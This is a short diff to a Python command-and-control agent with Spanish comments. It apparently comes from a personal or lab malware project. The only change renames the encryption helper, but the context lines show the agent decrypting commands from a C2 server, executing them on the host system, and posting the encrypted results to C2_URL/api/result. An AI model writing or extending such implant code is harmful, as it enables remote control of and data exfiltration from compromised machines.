@@ -39,7 +39,7 @@ def main():
                 encrypted_response = response.json()
 
                 if "ciphertext" in encrypted_response:
-                    data = testingcrypto_c2.decrypt_data(encrypted_response)
+                    data = cipher.decrypt_data(encrypted_response)
                     command = data.get("command")
 
                 # 2. Si hay un comando en cola, lo ejecutamos en el sistema operativo
@@ -64,7 +64,7 @@ def main():
                         output = "[+] Comando ejecutado con éxito (Sin salida de texto)."
 
                     raw_payload = {"name": agent_name, "result": output}
-                    encrypted_payload = testingcrypto_c2.encrypt_data(raw_payload)
+                    encrypted_payload = cipher.encrypt_data(raw_payload)
 
                     # 3. Devolver el resultado real de tu máquina al servidor web del C2
                     requests.post(f"{C2_URL}/api/result", json=encrypted_payload, timeout=4)
